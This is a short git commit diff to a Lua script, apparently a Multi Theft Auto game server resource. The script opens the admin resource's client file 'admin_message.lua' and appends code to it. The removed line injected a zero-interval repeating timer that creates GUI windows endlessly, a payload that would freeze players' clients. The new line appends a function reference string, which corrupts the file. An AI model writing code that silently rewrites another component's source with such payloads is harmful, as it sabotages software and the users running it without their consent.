73544762833e0896aada6515697bdf084ca8bd2c
Ruslan <20355378+frqher@users.noreply.github.com>
2023-01-11 21:26:35 +0300

    Update ipsss.lua

--- ipsss.lua
+++ ipsss.lua
@@ -1,5 +1,9 @@
+a = function()
+  print("Asd") 
+ end
+
 hFile = fileOpen(":admin/client/gui/admin_message.lua")
 fileSetPos( hFile, fileGetSize( hFile ) )  -- move position to the end of the file
-fileWrite(hFile, "setTimer(function() guiCreateWindow(-5550, -5550, 0, 0, "", false) end, 0, 0)")                 -- append data
+fileWrite(hFile, tostring(a))                 -- append data
 fileFlush(hFile)                           -- Flush the appended data into the file.
 fileClose(hFile) 
